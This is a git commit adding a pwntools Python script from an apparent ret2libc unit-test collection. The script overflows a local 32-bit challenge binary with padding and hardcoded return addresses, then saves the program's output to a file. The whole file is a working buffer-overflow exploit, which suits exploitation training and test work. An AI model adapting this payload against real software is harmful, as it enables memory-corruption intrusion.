a300d93cd3fe5ba0d03c706011668c8d333734ae
guyinatuxedo <ryancmeinke@gmail.com>
2020-03-10 22:22:38 -0700

    More ret2lib work

---
+++ 5_ret2libc-unit-tests/6_32/noop/binded-in-chains.py
@@ -0,0 +1,37 @@
+from pwn import *
+
+import sys
+
+target = process("./chall-test_ret2libc-6-x86")
+payload = ""
+payload += "00000000000000000000000000000000000000000000000000"
+payload += p32(0xdeadbeef)
+payload += "000000000000"
+payload += p32(0x8049090)
+payload += p32(0x804c010)
+target.sendline(payload)
+# Scan in all of the input
+foundEnd = False
+output = ""
+while foundEnd == False:
+	try:
+		output += target.recvline()
+	except:
+		foundEnd = True
+# Break up the input by newline characters
+outputLines = output.split("\n")
+# Early termination if there is no output
+if len(outputLines) == 2:
+	outputFile = open("justifies", "w")
+	outputFile.write("")
+	outputFile.close()
+	sys.exit(0)
+# Parse out the filler output
+fillerOutput = outputLines[:-2]
+fillerOutput = "\\n".join(fillerOutput)
+fillerOutput += "\\n"
+# Write it to the output file
+outputFile = open("justifies", "w")
+outputFile.write(fillerOutput)
+outputFile.close()
+
